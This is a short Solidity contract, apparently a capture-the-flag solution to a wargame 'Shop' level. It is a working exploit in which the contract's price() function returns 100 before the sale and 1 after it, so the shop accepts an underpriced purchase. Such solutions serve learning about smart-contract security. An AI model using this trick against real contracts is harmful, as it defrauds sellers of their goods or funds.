// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
    function isSold() external view returns(bool);
}

interface Buyer {
  function price() external view returns (uint);
}

contract BreakShop is Buyer {

    address public shopAddr;
    Shop public shop;

    constructor() {
        shopAddr = address(0x8a14f5b873b6192ACc6d413D7c432b469f5e5A09);
        shop = Shop(shopAddr);
    }
    
    function price() public view override returns (uint){
        bool isSold = shop.isSold();
        
        assembly {
            let result
            
            switch isSold
            case 1 {
                result := 1
            }
            default {
                result := 100
            }
            
            mstore(0x0, result)
            return (0x0, 32)
        }
    }
     function agorase() public {
        shop.buy();
    }

}

